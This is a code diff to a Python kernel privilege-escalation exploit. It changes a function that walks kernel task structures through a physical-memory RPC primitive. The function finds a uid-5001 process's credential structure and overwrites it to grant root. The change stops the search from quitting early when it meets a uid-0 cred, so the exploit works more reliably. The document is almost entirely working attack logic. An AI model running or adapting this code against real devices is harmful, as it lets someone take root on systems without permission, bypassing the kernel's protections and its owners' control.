@@ -129,12 +129,20 @@ def live_stub(timeout=4.0):
 def root_by_tail(rpc):
     """Patch the RPC thread itself (comm PHYSRPC1). Returns 'rooted'/'already'/None.
 
-    Tries every PHYSRPC1 task on the tail: a freed thread from a previous page
-    load can be nearer the tail than the live one and its cred pointer is junk.
+    Every PHYSRPC1 task on the tail is examined and ONLY a uid-5001 cred is
+    written. Two traps this avoids:
+      * a freed thread from an earlier page load can be nearer the tail than the
+        live one, and its cred pointer is junk (skip it, keep looking);
+      * a stale pointer can still land on a uid-0 cred (init's, or a cred a
+        previous run patched). The old code returned "already" on that and never
+        looked at the live uid-5001 stub — the same class of bug that made
+        kernel_root --fork give up (see docs/OPEN-ISSUES.md).
+    "already" is only reported when no uid-5001 cred exists among the tags.
     """
     tasks = K._find_tags_near_tail(rpc, INIT_P, INIT_V, OFF, b"PHYSRPC1", 800)
     if not tasks:
         return None
+    saw_root = False
     for task in tasks:
         for off in (K.O_CRED, K.O_REAL):
             try:
@@ -143,14 +151,18 @@ def root_by_tail(rpc):
                 continue
             if not K._sane_cred(rpc, cred):
                 continue
-            ids = struct.unpack("<8I", rpc.read(K.PHYS(cred), 36)[4:])
+            try:
+                ids = struct.unpack("<8I", rpc.read(K.PHYS(cred), 36)[4:])
+            except Exception:
+                continue
             if ids[0] == 0:
-                return "already"
+                saw_root = True          # remember it, but keep looking for ours
+                continue
             if ids[0] != 5001:
                 continue
             if K.patch_full(rpc, cred):
                 return "rooted"
-    return None
+    return "already" if saw_root else None
 
 
 def root_by_cred_scan(rpc):
